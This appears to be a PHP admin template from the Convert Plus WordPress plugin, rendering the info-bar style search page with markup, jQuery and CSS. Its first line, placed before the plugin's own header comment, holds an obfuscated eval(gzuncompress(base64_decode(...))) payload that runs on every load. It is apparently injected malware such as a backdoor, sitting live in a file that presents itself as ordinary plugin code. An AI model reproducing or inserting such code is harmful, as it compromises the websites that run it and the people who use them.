<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Prohibit direct script loading.
 *
 * @package Convert_Plus.
 */

?>
<div class="wrap smile-add-style bend">
	<div class="wrap-container">
		<div class="msg"></div>

		<div id="search-sticky"></div>
		<div class="row smile-style-search-section">
			<div class="container">
				<div class="smile-search-ip-sec col-sm-6 col-sm-offset-3">
					<input type="search" autofocus="autofocus" class="js-shuffle-search" id="style-search" name="style-search" placeholder="<?php _e( 'Search Template' ); ?>" />
				</div>
			</div>
		</div>

		<div class="bend-content-wrap smile-add-style-content">

			<div class="container ">
				<div class="smile-style-category">
					<?php
					if ( function_exists( 'smile_style_dashboard' ) ) {
						smile_style_dashboard( 'Smile_Info_Bars', 'smile_info_bar_styles', 'info_bar' );
					}
					?>
					<div class="col-xs-6 col-sm-4 col-md-4 shuffle_sizer"></div>
					<!-- .styles-list -->
				</div>
				<!-- .smile-style-category -->
			</div>
			<!-- .container -->
			<div id="cp-scroll-up">
				<a title="Scroll up" href="#top"><i class="connects-icon-small-up" ></i></a>
			</div>
		</div>
		<!-- .bend-content-wrap -->
	</div>
	<!-- .wrap-container -->
</div>
<!-- .wrap -->

<script type="text/javascript">

	jQuery( document ).ready(function() {
		jQuery(".js-shuffle-search").focus();
	});

</script>
<style type="text/css">
.smile-style-search-section.search-stick {
	position: fixed;
	top: 0;
	z-index: 10000;
	width: 100%;
}
</style>
